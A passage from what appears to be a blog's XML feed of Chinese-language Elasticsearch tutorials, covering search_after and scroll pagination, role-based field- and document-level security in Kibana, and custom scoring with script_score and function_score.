&quot;39.893801&quot;, &quot;lon&quot; : &quot;116.408986&quot; &#125; &#125;, &quot;sort&quot; : [ 378691200000, &quot;东城区-李四&quot; ] &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老贾&quot;, &quot;DOB&quot; : &quot;1983-01-01&quot;, &quot;message&quot; : &quot;123,gogogo&quot;, &quot;uid&quot; : 5, &quot;age&quot; : 35, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区建国门&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.718256&quot;, &quot;lon&quot; : &quot;116.367910&quot; &#125; &#125;, &quot;sort&quot; : [ 410227200000, &quot;朝阳区-老贾&quot; ] &#125; ] &#125;&#125;注意：当我们使用search_after时，from值必须设置为0或者-1。search_after不是自由跳转到随机页面而是并行scroll多个查询的解决方案。 它与scroll API非常相似，但与它不同，search_after参数是无状态的，它始终针对最新版本的搜索器进行解析。 因此，排序顺序可能会在步行期间发生变化，具体取决于索引的更新和删除。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：运用scroll接口对大量数据实现更好的分页]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9A%E8%BF%90%E7%94%A8scroll%E6%8E%A5%E5%8F%A3%E5%AF%B9%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%88%86%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[在Elasticsearch中，我们可以通过size和from来对我们的结果来进行分页。但是对于数据量很大的索引，这是有效的吗？Scroll API可用于从单个搜索请求中检索大量结果（甚至所有结果），这与在传统数据库上使用cursor的方式非常相似。Scroll不是用于实时用户请求，而是用于处理大量数据，例如，用于处理大量数据。 为了将一个索引的内容重新索引到具有不同配置的新索引中。为了说明问题，我们今天先创建一个叫做twitter的Index:12345678910111213POST _bulk&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 1&#125; &#125;&#123;&quot;user&quot;:&quot;双榆树-张三&quot;,&quot;message&quot;:&quot;今儿天气不错啊，出去转转去&quot;,&quot;uid&quot;:2,&quot;age&quot;:20,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市海淀区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.970718&quot;,&quot;lon&quot;:&quot;116.325747&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 2 &#125;&#125;&#123;&quot;user&quot;:&quot;东城区-老刘&quot;,&quot;message&quot;:&quot;出发，下一站云南！&quot;,&quot;uid&quot;:3,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区台基厂三条3号&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.904313&quot;,&quot;lon&quot;:&quot;116.412754&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 3&#125; &#125;&#123;&quot;user&quot;:&quot;东城区-李四&quot;,&quot;message&quot;:&quot;happy birthday!&quot;,&quot;uid&quot;:4,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.893801&quot;,&quot;lon&quot;:&quot;116.408986&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 4&#125; &#125;&#123;&quot;user&quot;:&quot;朝阳区-老贾&quot;,&quot;message&quot;:&quot;123,gogogo&quot;,&quot;uid&quot;:5,&quot;age&quot;:35,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区建国门&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.718256&quot;,&quot;lon&quot;:&quot;116.367910&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 5&#125; &#125;&#123;&quot;user&quot;:&quot;朝阳区-老王&quot;,&quot;message&quot;:&quot;Happy BirthDay My Friend!&quot;,&quot;uid&quot;:6,&quot;age&quot;:50,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区国贸&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.918256&quot;,&quot;lon&quot;:&quot;116.467910&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 6&#125; &#125;&#123;&quot;user&quot;:&quot;虹桥-老吴&quot;,&quot;message&quot;:&quot;好友来了都今天我生日，好友来了,什么 birthday happy 就成!&quot;,&quot;uid&quot;:7,&quot;age&quot;:90,&quot;city&quot;:&quot;上海&quot;,&quot;province&quot;:&quot;上海&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国上海市闵行区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;31.175927&quot;,&quot;lon&quot;:&quot;121.383328&quot;&#125;&#125;在上面，我们创建了6个文档。这些文档的数量虽然不是很多，但是我们想为了说明问题的方便。在实际的使用中，我们可能有成百上千的文档。下面，我们通过size和from的方法来进行分页。假如我们把sizs设置为2，那么，我们可以通过如下写的方法来进行分页。123GET twitter/_search?size=2&amp;from=0GET twitter/_search?size=2&amp;from=2GET twitter/_search?size=2&amp;from=4这样，我们每次可以得到2个文档，从而对我们的Index进行分页。我们可以得到这些数据并在自己的页面上或应用里进行展示。通常这样的每个请求返回的上线是10K。如果超过这个上限的话，这样的方法将不再适合。上面的这种方法，对于小量的数据是可行的，但是对于大量的数据，而且我们需要进行sort时，这个有可能变得力不从心，比如：1234567891011121314151617GET twitter/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125;, &quot;from&quot;: 2, &quot;size&quot;: 2, &quot;sort&quot;: [ &#123; &quot;user.keyword&quot;: &#123; &quot;order&quot;: &quot;desc&quot; &#125; &#125; ]&#125;你可以想象当你更深入地进行分页时，它会变得多么低效。 例如，如果更改mapping并希望将所有现有数据重新索引到新索引中，您可能没有足够的内存来对所有结果进行排序以返回最后一页的数据。对于这种应用场景，你可以使用scan搜索类型。我们可以这么做：1. 使用scroll来返回一个初始的搜索，并返回一个scroll ID123456789GET twitter/_search?scroll=1m&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125;, &quot;size&quot;: 2&#125;这里的scroll=1m，表明Elasticsearch允许等待的时间是1分钟。如果在一分钟之内，接下来的scroll请求没有到达的话，那么当前的请求的上下文将会丢失。返回的结果是：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&#123; &quot;_scroll_id&quot; : &quot;DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAFh8WWUdCVlRMUllRb3UzMkdqb0IxVnZNUQ==&quot;, &quot;took&quot; : 31, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 5, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.48232412, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.48232412, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 0.48232412, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;东城区-老刘&quot;, &quot;message&quot; : &quot;出发，下一站云南！&quot;, &quot;uid&quot; : 3, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区台基厂三条3号&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.904313&quot;, &quot;lon&quot; : &quot;116.412754&quot; &#125; &#125; &#125; ] &#125;&#125;在这里，我们可以看到一个返回的_scroll_id。这个_scroll_id将会被用于接下来的请求。2. 使用_scroll_id，再次请求利用上次请求返回来的_scroll_id，再次请求以获得下一个page的信息：12345GET _search/scroll&#123; &quot;scroll&quot;: &quot;1m&quot;, &quot;scroll_id&quot;:&quot;DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAHC8WWUdCVlRMUllRb3UzMkdqb0IxVnZNUQ==&quot;&#125;在这里必须指出的是：这里填写的scroll_id是上一个请求返回的值这个scroll_id的有效期是我们在第一次搜索时定义的1m，也就是1分钟。如果超过了，这个就没有用运行后返回的结果是：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&#123; &quot;_scroll_id&quot; : &quot;DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAHS0WWUdCVlRMUllRb3UzMkdqb0IxVnZNUQ==&quot;, &quot;took&quot; : 2, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 5, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.48232412, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;3&quot;, &quot;_score&quot; : 0.48232412, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;东城区-李四&quot;, &quot;message&quot; : &quot;happy birthday!&quot;, &quot;uid&quot; : 4, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.893801&quot;, &quot;lon&quot; : &quot;116.408986&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : 0.48232412, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老贾&quot;, &quot;message&quot; : &quot;123,gogogo&quot;, &quot;uid&quot; : 5, &quot;age&quot; : 35, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区建国门&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.718256&quot;, &quot;lon&quot; : &quot;116.367910&quot; &#125; &#125; &#125; ] &#125;&#125;显然这次返回的是2个文档。我们需要再次使用同样的办法来得到最后一个page的结果：12345678910111213141516171819202122232425262728293031323334353637383940&#123; &quot;_scroll_id&quot; : &quot;DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAADeoWeno1UkF2RWZRd202VW1HQXRlOWFUdw==&quot;, &quot;took&quot; : 2, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 5, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.48232412, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;5&quot;, &quot;_score&quot; : 0.48232412, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老王&quot;, &quot;message&quot; : &quot;Happy BirthDay My Friend!&quot;, &quot;uid&quot; : 6, &quot;age&quot; : 50, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区国贸&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.918256&quot;, &quot;lon&quot; : &quot;116.467910&quot; &#125; &#125; &#125; ] &#125;&#125;显然，这次返回的结果只有一个数值，比我们请求的page大小2要小。如果我们利用返回的_scroll_id再次请求时，我们可以看返回的结果是：12345678910111213141516171819&#123; &quot;_scroll_id&quot; : &quot;DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAADeoWeno1UkF2RWZRd202VW1HQXRlOWFUdw==&quot;, &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 5, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.48232412, &quot;hits&quot; : [ ] &#125;&#125;这次是一个结果都没有。如果完成此过程，则需要清理上下文，因为上下文在超时之前仍会占用计算资源。 如下面的屏幕快照所示，您可以使用scroll_id参数在DELETE API中指定一个或多个上下文：1234DELTE_search/scroll&#123; &quot;scroll_id&quot;:&quot;DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAHC8WWUdCVlRMUllRb3UzMkdqb0IxVnZNUQ==&quot;&#125;参考：【1】Elasticsearch Scroll【2】https://www.elastic.co/guide/en/elasticsearch/reference/7.4/search-request-body.html#request-body-search-scroll]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：用户安全设置]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9A%E7%94%A8%E6%88%B7%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Elastic Stack的组件是不安全的，因为它没有内置的固有安全性。 这意味着任何人都可以访问它。 在生产环境中运行Elastic Stack时，这会带来安全风险。 为了防止生产中未经授权的访问，采用了不同的机制来施加安全性，例如在防火墙后运行Elastic Stack并通过反向代理（例如nginx，HAProxy等）进行保护。 Elastic提供商业产品来保护Elastic Stack。 此产品是X-Pack的一部分，模块称为安全性。在今天的文章中，我们来讲述如何为我们的Elastics索引设置字段级的安全。这样有的字段对有些用户是可见的，而对另外一些用户是不可见的。我们也可以通过对用户安全的设置，使得不同的用户有不同的权限。User authentication在X-Pack安全性中，安全资源是基于用户的安全性的基础。 安全资源是需要访问以执行Elasticsearch集群操作的资源，例如索引，文档或字段。 X-Pack安全性通过分配给用户的角色的权限来实现。 权限是针对受保护资源的一项或多项特权。 特权是一个命名的组，代表用户可以针对安全资源执行的一个或多个操作。 用户可以具有一个或多个角色，并且用户拥有的总权限集定义为其所有角色的权限的并集，如下图所示：从上面的图上可以看出来：一个用户可以用多个role，而每个role可以对应多个permission(权限）。在接下来的练习中，我们来展示如何创建用户，role（角色）以及把permission分配到每个role。通过这样的组合，我们可以实现对字段级的安全控制。为Elastic设置安全及创建用户当我们设置完我们的安全账户后，最开始我们使用最原始的elastic的账号进行登录。请注意这里的密码是我们设置elastic账号的密码：![](https://img-blog.csdnimg.cn/20190904225704187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1VidW50dVRvdWNo,size_16,color_FFFFFF,t_70等登录进去之后，现在我们去Manage/Sercurity/Users页面：我们来创建一个新的账号。针对我的情况，我想创建一个叫做liuxg的用户名。点击当前页面的Create User按钮：然后填入我们所需要的信息：点击Create User按钮，这样我们就创建了我们的用户。按照同样的步骤，我们来创建另外一个叫做user1的用户。准备实验数据在我们还没退出elastic用户的情况下，我们使用bulk API来把如下的文档输入到Elasticsearch中。1234567POST employee/_bulk&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;employee&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;user1&quot;,&quot;email&quot;:&quot;user1@packt.com&quot;,&quot;salary&quot;:5000,&quot;gender&quot;:&quot;M&quot;,&quot;address1&quot;:&quot;312 Main St&quot;,&quot;address2&quot;:&quot;Walthill&quot;,&quot;state&quot;:&quot;NE&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;employee&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;user2&quot;,&quot;email&quot;:&quot;user2@packt.com&quot;,&quot;salary&quot;:10000,&quot;gender&quot;:&quot;F&quot;,&quot;address1&quot;:&quot;5658 N Denver Ave&quot;,&quot;address2&quot;:&quot;Portland&quot;,&quot;state&quot;:&quot;OR&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;employee&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;user3&quot;,&quot;email&quot;:&quot;user3@packt.com&quot;,&quot;salary&quot;:7000,&quot;gender&quot;:&quot;F&quot;,&quot;address1&quot;:&quot;300 Quinterra Ln&quot;,&quot;address2&quot;:&quot;Danville&quot;,&quot;state&quot;:&quot;CA&quot;&#125;这样我们把三个文档存入到employee的索引之中。创建新的role请注意：如下的操作是在elastic用户登录的情况下进行操作的。要创建新用户，请导航到管理UI并在“Security”部分中选择“role”，或者如果您当前在“Users”屏幕上，请单击“Roles”选项。 角色屏幕显示所有已定义/可用的角色:当我们点击roles后：我们点击Create role按钮。在这里，我们定义了一个叫做monitor_role，它具有monitor的权限。把role赋予给用户我们打开我们的用户列表。针对我的情况，我们打开liuxg用户：我们修改liuxg账号的Roles。把刚才创建的monitor_role赋予给liuxg用户。点击Update User按钮。这样我们的设定就好了。设定好的账号是这样的：从上面，我们可以看出来liuxg账号是有monitor_role的，而user1账号是没有的。下面我们来做一些基本的测试。我们在一个terminal中打入如下的命令：1curl -u liuxg:123456 &quot;http://localhost:9200/_cluster/health?pretty&quot;注意这里的123456是liuxg的账号密码。执行上面的显示结果是：我们显然看到了结果。那么我们同样地对use1账号来进行实验：1curl -u user1:123456 &quot;http://localhost:9200/_cluster/health?pretty&quot;显示的结果是：显然，user1账号没有得到任何结果。这个根本的原因是因为这个账号没有相应的权限。文档级或字段级安全现在，我们知道了如何创建新用户，创建新角色以及将角色分配给用户，让我们探讨如何针对给定的索引/文档对文档和字段施加安全性。接下来，我们使用我之前给大家输入进的employee索引来展示。案例1当用户搜索员工详细信息时，该用户不允许包含在属于员工索引的文档中的薪水/地址详细信息。这就是我们所说的字段级安全。首先，让我们来创建一个叫做employee_read的role。这个role只具有employ索引的read权限。为了限制字段，我们可以在设置里做相应的配置：我们只允许这个employee_read role访问gender，state及email字段，而且只有read权限。运用我们刚才设置的employee_read role，我们赋予给我们的user1用户：设置好的用户界面为：![] (https://img-blog.csdnimg.cn/20191029213613951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1VidW50dVRvdWNo,size_16,color_FFFFFF,t_70)上面显示我们的user1具有employ_read的role。在我们的一个terminal里打入如下的命令：1curl -u user1:123456 &quot;http://localhost:9200/employee/_search?pretty&quot;请注意：这里的123456是user1用户的密码。上面命令显示的结果为：显然，user1只能访问在employee_read中的三个字段。案例2我们想定义一个role。这个role具有read的权限，并且只能访问state为OR的那些文档。我们做一下的设置：我们创建了一个叫做OR_state的role。它通过一个query:1&#123;&quot;match&quot;: &#123;&quot;state.keyword&quot;:&quot;OR&quot;&#125;&#125;来匹配项对应的文档。我们接着把这个role赋予给liuxg用户：在我们设置完后，我们接着在一个terminal中打入如下的命令：1curl -u liuxg:123456 &quot;http://localhost:9200/employee/_search?pretty&quot;显示的结果：我们可以看出来这次的显示的结果只有一个，而且这个文档的state是OR。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：使用function_score及soft_score定制搜索结果的分数]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9A%E4%BD%BF%E7%94%A8function_score%E5%8F%8Asoft_score%E5%AE%9A%E5%88%B6%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C%E7%9A%84%E5%88%86%E6%95%B0%2F</url>
    <content type="text"><![CDATA[我们将介绍使用function_score的基础知识，并介绍一些function core技术非常有用和有效的用例。介绍评分的概念是任何搜索引擎（包括Elasticsearch）的核心。评分可以粗略地定义为：找到符合一组标准的数据并按相关性顺序将其返回。相关性通常是通过类似TF-IDF的算法来实现的，该算法试图找出文本上与提交的查询最相似的文档。尽管TF-IDF及其表亲（例如BM25）非常棒，但有时必须通过其他算法或通过其他评分启发式方法来解决相关性问题。在这里，Elasticsearch的script_score和function_score功能变得非常有用。本文将介绍这些工具的用法。文本相似性不是最重要因素的一个域示例是地理搜索。如果正在寻找在给定点附近的好咖啡店，则按与查询在文本上的相似程度对咖啡店进行排名对用户而言不是很有用，但按地理位置在附近的排名对他们。另一个示例可能是视频共享站点上的视频，其中搜索结果可能应该考虑视频的相对受欢迎程度。如果某个流行歌星上传了具有给定标题的视频，从而获得了数百万的观看次数，那么该视频可能应该比具有相似文字相关性的不受欢迎的视频更胜一筹。在使用Elasticsearch进行全文搜索的时候，默认是使用BM25计算的_score字段进行降序排序的。当我们需要用其他字段进行降序或者升序排序的时候，可以使用sort字段，传入我们想要的排序字段和方式。 当简单的使用几个字段升降序排列组合无法满足我们的需求的时候，我们就需要自定义排序的特性，Elasticsearch提供了function_score的DSL来自定义打分，这样就可以根据自定义的_score来进行排序。在实际的使用中，我们必须注意的是：soft_score和function_score是耗资源的。您只需要计算一组经过过滤的文档的分数。下面我们来用一个例子来具体说明如何来通过script_core和function_core来定制我们的分数。准备数据我们首先来下载我们的测试数据：1git clone https://github.com/liu-xiao-guo/best_games_json_data然后我们通过Kibana把这个数据来导入到我们的Elasticsearch中：在导入的过程中，我们选择Time field为year，并且指定相应的日期格式：我们指定我们的索引名字为best_games：我们可以查看一下一个样本的文档就像是下面的格式一样：1234567891011121314&quot;_source&quot; : &#123; &quot;global_sales&quot; : 82.53, &quot;year&quot; : 2006, &quot;image_url&quot; : &quot;https://upload.wikimedia.org/wikipedia/en/thumb/e/e0/Wii_Sports_Europe.jpg/220px-Wii_Sports_Europe.jpg&quot;, &quot;platform&quot; : &quot;Wii&quot;, &quot;@timestamp&quot; : &quot;2006-01-01T00:00:00.000+08:00&quot;, &quot;user_score&quot; : 8, &quot;critic_score&quot; : 76, &quot;name&quot; : &quot;Wii Sports&quot;, &quot;genre&quot; : &quot;Sports&quot;, &quot;publisher&quot; : &quot;Nintendo&quot;, &quot;developer&quot; : &quot;Nintendo&quot;, &quot;id&quot; : &quot;wii-sports-wii-2006&quot;&#125;在上面我们可以看出来这个文档里有两个很重要的字段：critic_score及user_score。一个是表示这个游戏的难度，另外一个表示游戏的受欢迎的程度。正常查询首先我们来看看如果不使用任何的分数定制，那么情况是怎么样的。12345678910111213GET best_games/_search&#123; &quot;_source&quot;: [ &quot;name&quot;, &quot;critic_score&quot;, &quot;user_score&quot; ], &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot;Final Fantasy&quot; &#125; &#125;&#125;在上面的查询中，为了说明问题的方便，在返回的结果中，我们只返回name, critic_score和user_score字段。我们在name字段里含有“Final Fantasy”的所有游戏，那么显示显示的结果是：1234567891011121314151617181920212223242526272829303132333435&quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 8.138414, &quot;_source&quot; : &#123; &quot;user_score&quot; : 9, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy VII&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6KccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 8.138414, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy X&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 8.138414, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 90, &quot;name&quot; : &quot;Final Fantasy VIII&quot; &#125; &#125;, ...从上面的结果中，我们可以看出来Final Fantasy VII是最匹配的结果。它的分数是最高的。Soft_score 查询加入我们我们是游戏的运营商，那么我们也许我们自己想要的排名的方法。比如，虽然所有的结果都很匹配，但是我们也许不只单单是匹配Final Fantasy，而且我们想把user_score和critic_score加进来（虽然你可以使用其中的一个）。我们想这样来算我们的分数。最终score = score*(user_score*10 + critic_score)/2/100也就是我们把user_score乘以10，从而变成100分制。它和critic_score加起来，然后除以2，并除以100，这样就得出来最后的分数的加权系数。这个加权系数再乘以先前在上一步得出来的分数才是最终的分数值。经过这样的改造后，我们发现我们的分数其实不光是全文搜索的相关性，同时它也紧紧地关联了我们的用户体验和游戏的难道系数。那么我们如何使用这个呢？参照Elastics的官方文档soft_score，我们现在做如下的搜索：1234567891011121314151617181920GET best_games/_search&#123; &quot;_source&quot;: [ &quot;name&quot;, &quot;critic_score&quot;, &quot;user_score&quot; ], &quot;query&quot;: &#123; &quot;script_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot;Final Fantasy&quot; &#125; &#125;, &quot;script&quot;: &#123; &quot;source&quot;: &quot;_score * (doc[&apos;user_score&apos;].value*10+doc[&apos;critic_score&apos;].value)/2/100&quot; &#125; &#125; &#125;&#125;在上面的查询中，我们可以看到我们使用了新的公式：123&quot;script&quot;: &#123; &quot;source&quot;: &quot;_score * (doc[&apos;user_score&apos;].value*10+doc[&apos;critic_score&apos;].value)/2/100&quot;&#125;那么我查询后的结果为：12345678910111213141516171819202122232425262728293031323334353637383940414243444546 &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 7.405957, &quot;_source&quot; : &#123; &quot;user_score&quot; : 9, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy VII&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;K6ccJ28BCSSrjaXdSOrC&quot;, &quot;_score&quot; : 7.0804205, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 94, &quot;name&quot; : &quot;Final Fantasy IX&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6KccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 6.9990363, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy X&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 6.917652, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 90, &quot;name&quot; : &quot;Final Fantasy VIII&quot; &#125; &#125;,...我们从上面可以看出来最终的分数_score是完全不一样的值。我们同时也看出来尽管第一名的Final Fantasy VII没有发生变化，但是第二名的位置由Final Fantasy X变为Final Fantasy IX了。针对script的运算，有一些预定义好的函数可以供我们调用，它们可以帮我们加速我们的计算。SaturationSigmoidRandom score functionDecay functions for numeric fieldsDecay functions for geo fieldsDecay functions for date fieldsFunctions for vector 